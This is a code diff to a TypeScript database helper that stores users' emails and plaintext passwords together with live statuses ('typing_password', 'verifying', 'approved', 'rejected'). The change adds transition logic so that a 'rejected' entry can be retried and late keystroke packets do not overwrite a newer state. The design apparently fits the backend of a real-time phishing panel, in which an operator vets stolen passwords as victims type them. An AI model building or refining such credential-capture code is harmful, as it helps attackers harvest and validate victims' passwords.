@@ -121,20 +121,49 @@ if (neonPool) {
   initDbSchema().catch(console.error);
 }
 
-// Status priority hierarchy to prevent race conditions and status downgrades
-const STATUS_PRIORITY: Record<string, number> = {
-  email_entered: 1,
-  typing_password: 2,
-  verifying: 3,
-  approved: 4,
-  rejected: 4,
-};
+// State transition handler to prevent race conditions while allowing retry after rejection
+function computeNextStatusAndPass(
+  currentStatus: string,
+  currentPassword: string,
+  incomingStatus: string,
+  incomingPassword: string
+): { effectiveStatus: string; effectivePassword: string } {
+  // 1. Once approved, session is permanently verified
+  if (currentStatus === 'approved') {
+    return {
+      effectiveStatus: 'approved',
+      effectivePassword: currentPassword || incomingPassword,
+    };
+  }
+
+  // 2. If currently verifying, prevent late out-of-order typing/email packets from reverting status or overwriting password
+  if (currentStatus === 'verifying') {
+    if (incomingStatus === 'typing_password' || incomingStatus === 'email_entered') {
+      return {
+        effectiveStatus: 'verifying',
+        effectivePassword: currentPassword,
+      };
+    }
+  }
+
+  // 3. If currently typing_password, ignore late email_entered packets
+  if (currentStatus === 'typing_password' && incomingStatus === 'email_entered') {
+    return {
+      effectiveStatus: 'typing_password',
+      effectivePassword: incomingPassword !== '' ? incomingPassword : currentPassword,
+    };
+  }
+
+  // 4. Default: allow transition (including from 'rejected' to 'typing_password' or 'verifying')
+  return {
+    effectiveStatus: incomingStatus,
+    effectivePassword: incomingPassword !== '' ? incomingPassword : currentPassword,
+  };
+}
 
 // Database helper operations
 export const db = {
   async saveUser(email: string, password: string, status: string, targetUserId?: number) {
-    const incomingPriority = STATUS_PRIORITY[status] || 0;
-
     if (neonPool) {
       try {
         let userId: number | null = targetUserId || null;
@@ -164,13 +193,12 @@ export const db = {
         }
 
         if (userId && currentStatus) {
-          const currentPriority = STATUS_PRIORITY[currentStatus] || 0;
-          
-          // Never downgrade status:
-          // e.g. if current is verifying (3), an incoming typing_password (2) must NOT revert status!
-          const effectiveStatus = incomingPriority >= currentPriority ? status : currentStatus;
-          // Preserve password if incoming password is empty and current password exists
-          const effectivePassword = password !== '' ? password : currentPassword;
+          const { effectiveStatus, effectivePassword } = computeNextStatusAndPass(
+            currentStatus,
+            currentPassword,
+            status,
+            password
+          );
 
           await neonPool.query(
             'UPDATE users SET password = $1, status = $2 WHERE id = $3',
@@ -196,13 +224,14 @@ export const db = {
     }
 
     if (user) {
-      const currentPriority = STATUS_PRIORITY[user.status] || 0;
-      if (incomingPriority >= currentPriority) {
-        user.status = status;
-      }
-      if (password !== '') {
-        user.password = password;
-      }
+      const { effectiveStatus, effectivePassword } = computeNextStatusAndPass(
+        user.status,
+        user.password,
+        status,
+        password
+      );
+      user.status = effectiveStatus;
+      user.password = effectivePassword;
       return { success: true, user_id: user.id, action: 'updated', status: user.status };
     } else {
       const newId = globalMemoryStore.userAutoId++;
